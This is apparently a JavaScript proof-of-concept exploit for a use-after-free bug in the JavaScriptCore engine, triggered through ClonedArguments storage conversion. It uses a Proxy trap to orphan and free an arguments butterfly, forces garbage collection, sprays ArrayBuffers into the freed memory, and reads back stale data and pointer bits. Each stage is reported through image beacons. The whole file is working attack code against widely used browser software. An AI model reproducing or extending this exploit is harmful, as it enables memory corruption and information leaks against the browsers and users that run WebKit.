// p242 - ClonedArguments UAF via storage type conversion
// The key: don't GROW the butterfly (libpas realloc in-place).
// Instead, CONVERT from Contiguous to ArrayStorage by setting
// a sparse index. This allocates a NEW butterfly, orphaning the old.
// Then GC the old, spray into its slot, read stale data.
// Beacon prefix: V242-

(function() {
  function B(tag) {
    try { new Image().src = '/beacon/V242-' + tag + '?t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  var NARGS = 16;
  var leaked = [];
  var sprayBufs = [];

  function attempt(round) {
    var args = [];
    for (var i = 0; i < NARGS; i++) args.push(i + 1);

    var result = null;
    try {
      result = (function() {
        delete arguments[1];

        var self = arguments;
        Object.setPrototypeOf(arguments, new Proxy({}, {
          get: function(target, prop) {
            if (prop === '1') {
              B('R' + round + '-TRAP');

              // Force Contiguous -> ArrayStorage conversion
              // This allocates a NEW butterfly, old one orphaned
              try {
                self[0x7fffffff] = 0xBEEF;
                B('R' + round + '-CONVERTED');
              } catch(e) {
                B('R' + round + '-CONV-ERR-' + e.message.substring(0, 20));
              }

              // GC to free the orphaned butterfly
              for (var g = 0; g < 5; g++) {
                var junk = [];
                for (var j = 0; j < 10000; j++) junk.push({x: j});
                junk = null;
              }
              B('R' + round + '-GC');

              // Spray ArrayBuffers matching old butterfly size
              // Old butterfly: 4*8 (outOfLine) + 8 (header) + NARGS*8 (contiguous)
              // = 32 + 8 + 128 = 168 bytes
              var SPRAY_SZ = 168;
              var spray = [];
              for (var s = 0; s < 500; s++) {
                var ab = new ArrayBuffer(SPRAY_SZ);
                var v = new Float64Array(ab);
                // Fill with recognizable pattern
                // offset 0-3: out-of-line properties area (4 slots)
                // offset 4: IndexingHeader
                // offset 5+: contiguous data (what data[] reads)
                // We want data[0] through data[NARGS-1]
                // data[0] is at butterfly + 0 in contiguous
                // After out-of-line(32) + header(8) = offset 40 in allocation
                // In Float64Array terms: element 5 onward
                for (var f = 0; f < v.length; f++) {
                  // Write 0xDEAD0000 + f as a tagged integer pattern
                  // JSC NaN-boxing: integers are value | NumberTag
                  // NumberTag = 0xfffe000000000000
                  // So integer N = 0xfffe000000000000 | N
                  // We write a distinctive int for each slot
                  var marker = 0xCAFE0000 + f + (round * 1000);
                  v[f] = marker;
                }
                spray.push(ab);
              }
              sprayBufs = spray;
              B('R' + round + '-SPRAY-' + spray.length);

              return 42;
            }
            return undefined;
          }
        }));

        // Trigger copyToArguments via apply
        return Array.of.apply(null, arguments);
      }).apply(null, args);
    } catch(e) {
      B('R' + round + '-ERR-' + String(e).substring(0, 40));
      return;
    }

    if (!result) { B('R' + round + '-NO-RESULT'); return; }
    B('R' + round + '-RESULT-LEN-' + result.length);

    // Check if any result values are NOT the original arguments
    var corrupted = 0;
    var originals = 0;
    for (var i = 0; i < result.length; i++) {
      var v = result[i];
      if (typeof v === 'number' && v >= 0xCAFE0000) {
        corrupted++;
        if (corrupted <= 5) {
          B('R' + round + '-STALE-' + i + '-' + v.toString(16));
        }
      } else if (typeof v === 'number' && v >= 1 && v <= NARGS) {
        originals++;
      } else if (typeof v === 'object' || typeof v === 'string') {
        B('R' + round + '-TYPE-' + i + '-' + typeof v);
      } else if (v === 42) {
        // This is slot 1, replaced by Proxy return
      } else if (v === undefined) {
        B('R' + round + '-UNDEF-' + i);
      } else {
        // Unknown value - could be leaked pointer bits
        B('R' + round + '-UNK-' + i + '-' + typeof v + '-' + String(v).substring(0, 20));
      }
    }
    B('R' + round + '-CORRUPT-' + corrupted + '-ORIG-' + originals);

    // If we see stale reads, try to extract pointer-like values
    if (corrupted > 0) {
      B('R' + round + '-HIT');
      // Read back via DataView for exact bits
      for (var i = 0; i < result.length && i < 20; i++) {
        if (typeof result[i] === 'number') {
          var buf = new ArrayBuffer(8);
          new Float64Array(buf)[0] = result[i];
          var dv = new DataView(buf);
          var hi = dv.getUint32(4, true);
          var lo = dv.getUint32(0, true);
          if (hi !== 0 && hi !== 0xfffe0000 && hi < 0xffff0000) {
            B('R' + round + '-PTR-' + i + '-' + hi.toString(16) + lo.toString(16));
          }
        }
      }
    }
  }

  // Run multiple rounds
  for (var r = 0; r < 5; r++) {
    attempt(r);
  }

  B('DONE');
})();
